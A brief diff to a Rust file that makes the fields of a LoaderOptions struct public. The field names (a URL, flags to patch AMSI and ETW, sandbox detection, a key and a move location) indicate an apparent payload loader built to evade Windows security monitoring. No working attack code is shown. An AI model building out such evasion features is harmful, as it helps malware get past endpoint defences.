@@ -9,13 +9,13 @@ use crate::misc::expand_env_vars;
 /// Struct to store options 
 #[derive(Clone)]
 pub struct LoaderOptions {
-    url: Url,
-    verbosity: u32,
-    patch_amsi: bool,
-    patch_etw: bool,
-    detect_sandbox: bool,
-    key: Option<String>,
-    move_location: Option<String>
+    pub url: Url,
+    pub verbosity: u32,
+    pub patch_amsi: bool,
+    pub patch_etw: bool,
+    pub detect_sandbox: bool,
+    pub key: Option<String>,
+    pub move_location: Option<String>
 }
 
 /// Dictate how the contents of the struct will be printed
